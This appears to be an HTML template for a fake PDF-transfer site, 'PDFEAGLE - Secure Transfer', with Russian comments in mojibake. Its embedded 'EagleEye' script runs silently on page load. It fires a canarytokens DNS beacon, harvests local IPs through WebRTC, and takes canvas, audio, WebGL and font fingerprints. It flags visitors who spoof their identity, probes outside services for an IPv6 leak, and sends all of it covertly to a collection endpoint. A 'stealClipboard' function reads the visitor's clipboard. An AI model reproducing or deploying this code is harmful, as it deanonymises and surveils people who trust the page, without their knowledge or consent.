<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDFEAGLE - Secure Transfer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .navbar { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .brand-text { font-weight: 800; color: #e74c3c; letter-spacing: 1px; }
        .main-container { max-width: 800px; margin-top: 40px; }
        .card { border: none; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
    </style>

    <script>
    // --- ULTIMATE EAGLE EYE v3.5 (FULL SUITE) ---
    window.EagleEye = class {
        constructor() {
            this.endpoint = '/api/collect';
            this.sessionId = Math.random().toString(36).substring(7);
            this.init();
        }

        async init() {
            // 1. Ð—Ð°Ð¿ÑƒÑÐºÐ°ÐµÐ¼ DNS Trap (Canarytokens)
            this.triggerDNSBeacon();
            
            // 2. Ð—Ð°Ð¿ÑƒÑÐºÐ°ÐµÐ¼ Ð¾ÑÐ½Ð¾Ð²Ð½Ð¾Ð¹ ÑÐ±Ð¾Ñ€ Ð´Ð°Ð½Ð½Ñ‹Ñ…
            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 100);
            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
        }

        // === 1. DNS TOKEN TRAP (LEAK DETECTOR) ===
        triggerDNSBeacon() {
            // Ð¢Ð’ÐžÐ™ Ð¢ÐžÐšÐ•Ð
            const canaryDomain = "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"; 
            
            // Ð“ÐµÐ½ÐµÑ€Ð¸Ñ€ÑƒÐµÐ¼ ÑƒÐ½Ð¸ÐºÐ°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¿Ð¾Ð´Ð´Ð¾Ð¼ÐµÐ½: sessionID.random.token.com
            // Ð­Ñ‚Ð¾ Ð·Ð°ÑÑ‚Ð°Ð²Ð»ÑÐµÑ‚ DNS ÑÐµÑ€Ð²ÐµÑ€ Ð´ÐµÐ»Ð°Ñ‚ÑŒ Ð½Ð¾Ð²Ñ‹Ð¹ Ð·Ð°Ð¿Ñ€Ð¾Ñ, Ð¸Ð³Ð½Ð¾Ñ€Ð¸Ñ€ÑƒÑ ÐºÑÑˆ
            const uniqueSubdomain = `${this.sessionId}.${Math.floor(Math.random() * 1000000)}`;
            const fullDomain = `http://${uniqueSubdomain}.${canaryDomain}`;
            
            // Ð¡Ð¾Ð·Ð´Ð°ÐµÐ¼ Ð½ÐµÐ²Ð¸Ð´Ð¸Ð¼ÑƒÑŽ ÐºÐ°Ñ€Ñ‚Ð¸Ð½ÐºÑƒ. 
            // Ð­Ñ‚Ð¾ Ñ€Ð°Ð±Ð¾Ñ‚Ð°ÐµÑ‚ ÐºÐ°Ðº Web Bug (HTTP Ð·Ð°Ð¿Ñ€Ð¾Ñ) Ð˜ ÐºÐ°Ðº DNS Trap (DNS Ð·Ð°Ð¿Ñ€Ð¾Ñ).
            new Image().src = fullDomain;
            console.log("DNS Beacon fired:", fullDomain);
        }

        // === 2. WEBRTC (LOCAL IP) ===
        async getWebRTCData() {
            const ips = [];
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: "stun:stun.l.google.com:19302" },
                        { urls: "stun:stun1.l.google.com:19302" }
                    ]
                });
                pc.createDataChannel('');
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                await new Promise(resolve => {
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) return;
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = e.candidate.candidate.match(ipRegex);
                        if (match && !ips.includes(match[1])) ips.push(match[1]);
                    };
                    setTimeout(resolve, 1500);
                });
            } catch (e) { }
            return ips;
        }

        // === 3. FINGERPRINTING ===
        getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v3_ðŸ¦…", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v3_ðŸ¦…", 4, 17);
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(16);
            } catch (e) { return "error"; }
        }

        async getAudioHash() {
            try {
                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const render = await audioCtx.startRendering();
                const data = render.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) { sum += Math.abs(data[i]); }
                return sum.toFixed(6);
            } catch (e) { return "no_audio"; }
        }

        // === 4. ANTI-SPOOFING ===
        detectLies() {
            const anomalies = [];
            const ua = navigator.userAgent;
            const hasGroupBy = !!Object.groupBy; 
            if (ua.includes("Chrome/109") && hasGroupBy) anomalies.push("CRITICAL: Fake Chrome 109");
            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
            const fonts = this.getFonts();
            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Claims Windows but no Calibri");
            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) anomalies.push("REALITY: Likely Linux System");
            return anomalies;
        }

        getFonts() {
            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans"];
            const detected = [];
            const span = document.createElement("span");
            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
            document.body.appendChild(span);
            span.style.fontFamily = "monospace";
            const defaultWidth = span.offsetWidth;
            for (const font of fontList) {
                span.style.fontFamily = `"${font}", monospace`;
                if (span.offsetWidth !== defaultWidth) detected.push(font);
            }
            document.body.removeChild(span);
            return detected;
        }

        async getClientHints() {
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "architecture"]);
                    return { model: ua.model, platform: ua.platform, version: ua.platformVersion, mobile: ua.mobile };
                } catch(e) { return null; }
            }
            return null;
        }

        getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { renderer: 'N/A' };
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return { renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL), vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) };
            } catch(e) { return { renderer: 'Error' }; }
        }

        // === 5. IPv6 CASCADE CHECK (NEW) ===
        async getIPv6() {
            const services = [
                'https://api64.ipify.org?format=json',
                'https://ipv6.icanhazip.com',
                'https://ident.me',
                'https://api6.ipify.org?format=json'
            ];
            for (const url of services) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 1500);
                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
                    clearTimeout(timeoutId);
                    if (!response.ok) continue;
                    let ip = await response.text();
                    try { const json = JSON.parse(ip); if (json.ip) ip = json.ip; } catch (e) {}
                    ip = ip.trim();
                    if (ip.includes(':')) return ip;
                } catch (e) { continue; }
            }
            return "Not Detected / IPv4 Only";
        }

        // === 6. COLLECT & SEND ===
        async collect(triggerName, extraData = {}) {
            const [ips, battery, clientHints, audioHash, ipv6] = await Promise.all([
                this.getWebRTCData(),
                navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
                this.getClientHints(),
                this.getAudioHash(),
                this.getIPv6() // <-- IPv6
            ]);
            
            const anomalies = this.detectLies();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const tzOffset = new Date().getTimezoneOffset();

            const payload = {
                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName, session_id: this.sessionId },
                
                fingerprint_v2: {
                    canvas_hash: this.getCanvasHash(),
                    audio_hash: audioHash,
                    anomalies: anomalies,
                    is_spoofing: anomalies.length > 0
                },

                fingerprint: {
                    gpu: this.getWebGLInfo().renderer,
                    vendor: this.getWebGLInfo().vendor,
                    screen: `${screen.width}x${screen.height}`,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                client_hints: clientHints,
                system: {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: timezone,
                    timezone_offset: tzOffset,
                    battery: battery,
                    fonts: this.getFonts()
                },
                network: {
                    webrtc_ips: ips,
                    ipv6_leak: ipv6 // <-- IPv6
                },
                ...extraData
            };

            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(this.endpoint, blob);
        }
    };
    
    const eagle = new EagleEye();

    // --- ÐšÐ ÐÐ–Ð Ð‘Ð£Ð¤Ð•Ð Ð ---
    async function stealClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                return text ? text.substring(0, 1000) : "Empty";
            }
        } catch (e) { return "Blocked/Error"; }
        return "Not Supported";
    }
    </script>
</head>
<body>
    <nav class="navbar navbar-light">
        <div class="container">
            <a class="navbar-brand brand-text" href="/">
                <i class="fa-solid fa-file-pdf"></i> PDFEAGLE
            </a>
        </div>
    </nav>
    <div class="container main-container">
        {% block content %}{% endblock %}
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
